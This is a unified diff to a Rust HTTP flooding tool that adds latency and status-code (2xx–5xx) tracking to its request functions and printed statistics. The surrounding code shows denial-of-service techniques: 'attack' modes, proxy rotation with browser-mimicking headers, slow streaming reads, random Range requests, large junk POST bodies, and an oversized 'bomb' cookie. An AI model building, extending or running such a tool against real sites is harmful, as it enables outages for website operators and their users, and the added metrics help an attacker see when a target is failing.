@@ -334,28 +334,33 @@ async fn tcp_check(addr: &str, timeout: u64) -> bool {
     tokio::time::timeout(Duration::from_secs(timeout), tokio::net::TcpStream::connect(a)).await.ok().and_then(|r| r.ok()).is_some()
 }
 
-async fn fetch_page(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<usize, reqwest::Error> {
+async fn fetch_page(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
     let builder = add_session_cookie(browser_request(c.get(&url)), proxy_idx, &sessions);
     let resp = builder.send().await?;
+    let status = resp.status().as_u16();
     update_session_from_headers(proxy_idx, &sessions, resp.headers());
-    Ok(resp.bytes().await?.len())
+    let bytes = resp.bytes().await?.len();
+    Ok((bytes, status))
 }
 
-async fn fetch_range(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<usize, reqwest::Error> {
+async fn fetch_range(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
     let end = 100 + (rand::rng().random_range(0..9000));
     let builder = browser_request(c.get(&url)).header("Range", format!("bytes=0-{}", end))
         .header("Accept", "*/*").header("Cache-Control", "no-cache");
     let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
+    let status = resp.status().as_u16();
     update_session_from_headers(proxy_idx, &sessions, resp.headers());
-    Ok(resp.bytes().await?.len())
+    let bytes = resp.bytes().await?.len();
+    Ok((bytes, status))
 }
 
-async fn fetch_slow(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<usize, reqwest::Error> {
+async fn fetch_slow(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
     let builder = browser_request(c.get(&url)).header("Accept", "*/*").header("Cache-Control", "no-cache");
     let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
+    let status = resp.status().as_u16();
     update_session_from_headers(proxy_idx, &sessions, resp.headers());
     let mut total = 0usize;
     let mut stream = resp.bytes_stream();
@@ -364,28 +369,32 @@ async fn fetch_slow(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: u
         if let Ok(c) = &chunk { total += c.len(); }
         tokio::time::sleep(Duration::from_millis(100)).await;
     }
-    Ok(total)
+    Ok((total, status))
 }
 
-async fn fetch_post(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<usize, reqwest::Error> {
+async fn fetch_post(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
     let body = "x".repeat(5000 + (rand::rng().random_range(0..15000)));
     let builder = browser_request(c.post(&url)).header("Content-Type", "application/x-www-form-urlencoded")
         .header("Cache-Control", "no-cache").body(body);
     let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
+    let status = resp.status().as_u16();
     update_session_from_headers(proxy_idx, &sessions, resp.headers());
-    Ok(resp.bytes().await?.len())
+    let bytes = resp.bytes().await?.len();
+    Ok((bytes, status))
 }
 
-async fn fetch_cookie(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<usize, reqwest::Error> {
+async fn fetch_cookie(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
     let bomb_payload = "x".repeat(8192);
     let cookie = format!("_ga={}; _gid={}; session={}; bomb={}",
         rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), bomb_payload);
     let builder = browser_request(c.get(&url)).header("Accept", "*/*").header("Cache-Control", "no-cache");
     let resp = add_session_and_extra_cookie(builder, proxy_idx, &sessions, &cookie).send().await?;
+    let status = resp.status().as_u16();
     update_session_from_headers(proxy_idx, &sessions, resp.headers());
-    Ok(resp.bytes().await?.len())
+    let bytes = resp.bytes().await?.len();
+    Ok((bytes, status))
 }
 
 #[derive(Clone)]
@@ -394,6 +403,12 @@ struct Stats {
     total_requests: Arc<AtomicU64>,
     total_bytes: Arc<AtomicU64>,
     errors: Arc<AtomicU64>,
+    total_latency_ms: Arc<AtomicU64>,
+    status_2xx: Arc<AtomicU64>,
+    status_3xx: Arc<AtomicU64>,
+    status_4xx: Arc<AtomicU64>,
+    status_5xx: Arc<AtomicU64>,
+    status_other: Arc<AtomicU64>,
 }
 
 impl Stats {
@@ -403,6 +418,12 @@ impl Stats {
             total_requests: Arc::new(AtomicU64::new(0)),
             total_bytes: Arc::new(AtomicU64::new(0)),
             errors: Arc::new(AtomicU64::new(0)),
+            total_latency_ms: Arc::new(AtomicU64::new(0)),
+            status_2xx: Arc::new(AtomicU64::new(0)),
+            status_3xx: Arc::new(AtomicU64::new(0)),
+            status_4xx: Arc::new(AtomicU64::new(0)),
+            status_5xx: Arc::new(AtomicU64::new(0)),
+            status_other: Arc::new(AtomicU64::new(0)),
         }
     }
 }
@@ -731,6 +752,7 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                 let idx1 = rand::rng().random_range(0..assets.len());
                 let pool_clone = pool.clone();
                 let _ = tokio::spawn(async move {
+                    let start_req = Instant::now();
                     let result = match attack {
                         AttackMode::Bandwidth | AttackMode::Normal => {
                             if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, idx, sessions_clone.clone()).await }
@@ -773,10 +795,19 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                             fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), delay, 0, idx, sessions_clone.clone()).await
                         }
                     };
+                    let latency = start_req.elapsed().as_millis() as u64;
                     match result {
-                        Ok(bytes) => {
+                        Ok((bytes, status)) => {
                             stats_clone.total_requests.fetch_add(1, Ordering::Relaxed);
                             stats_clone.total_bytes.fetch_add(bytes as u64, Ordering::Relaxed);
+                            stats_clone.total_latency_ms.fetch_add(latency, Ordering::Relaxed);
+                            match status {
+                                200..=299 => { stats_clone.status_2xx.fetch_add(1, Ordering::Relaxed); }
+                                300..=399 => { stats_clone.status_3xx.fetch_add(1, Ordering::Relaxed); }
+                                400..=499 => { stats_clone.status_4xx.fetch_add(1, Ordering::Relaxed); }
+                                500..=599 => { stats_clone.status_5xx.fetch_add(1, Ordering::Relaxed); }
+                                _ => { stats_clone.status_other.fetch_add(1, Ordering::Relaxed); }
+                            }
                             pool_clone.lock().unwrap().report_success(idx);
                         }
                         Err(_) => {
@@ -1135,17 +1166,24 @@ async fn main() {
                 let cur_reqs = stats.total_requests.load(Ordering::Relaxed);
                 let cur_bytes = stats.total_bytes.load(Ordering::Relaxed);
                 let cur_errors = stats.errors.load(Ordering::Relaxed);
+                let cur_latency = stats.total_latency_ms.load(Ordering::Relaxed);
 
                 let now = Instant::now();
                 let delta_t = now.duration_since(last_time).as_secs_f64();
                 if delta_t > 0.0 {
                     let req_rate = (cur_reqs - last_requests) as f64 / delta_t;
                     let byte_rate = (cur_bytes - last_bytes) as f64 / delta_t / 1024.0;
+                    let avg_latency = if cur_reqs > 0 { cur_latency as f64 / cur_reqs as f64 } else { 0.0 };
                     println!(
-                        "  [Elapsed: {}s] {:.1} req/s | {:.2} KB/s | Errors: {}",
+                        "  [Elapsed: {}s] {:.1} req/s | {:.2} KB/s | Latency: {:.1}ms | 2xx: {} | 3xx: {} | 4xx: {} | 5xx: {} | Errors: {}",
                         start.elapsed().as_secs(),
                         req_rate,
                         byte_rate,
+                        avg_latency,
+                        stats.status_2xx.load(Ordering::Relaxed),
+                        stats.status_3xx.load(Ordering::Relaxed),
+                        stats.status_4xx.load(Ordering::Relaxed),
+                        stats.status_5xx.load(Ordering::Relaxed),
                         cur_errors
                     );
                 }
@@ -1162,11 +1200,19 @@ async fn main() {
 
             let final_reqs = stats.total_requests.load(Ordering::Relaxed);
             let final_bytes = stats.total_bytes.load(Ordering::Relaxed);
+            let final_latency = stats.total_latency_ms.load(Ordering::Relaxed);
+            let final_avg_latency = if final_reqs > 0 { final_latency as f64 / final_reqs as f64 } else { 0.0 };
             let final_stats = format!(
-                "Completed: {} req, {} bytes ({:.2} KB/s)",
+                "Completed: {} req, {} bytes ({:.2} KB/s) | Avg Latency: {:.1}ms | 2xx: {} | 3xx: {} | 4xx: {} | 5xx: {} | Errors: {}",
                 final_reqs,
                 final_bytes,
                 final_bytes as f64 / elapsed_secs as f64 / 1024.0,
+                final_avg_latency,
+                stats.status_2xx.load(Ordering::Relaxed),
+                stats.status_3xx.load(Ordering::Relaxed),
+                stats.status_4xx.load(Ordering::Relaxed),
+                stats.status_5xx.load(Ordering::Relaxed),
+                stats.errors.load(Ordering::Relaxed)
             );
             println!("  {}", final_stats);
             if let Some(ref path) = output_csv {
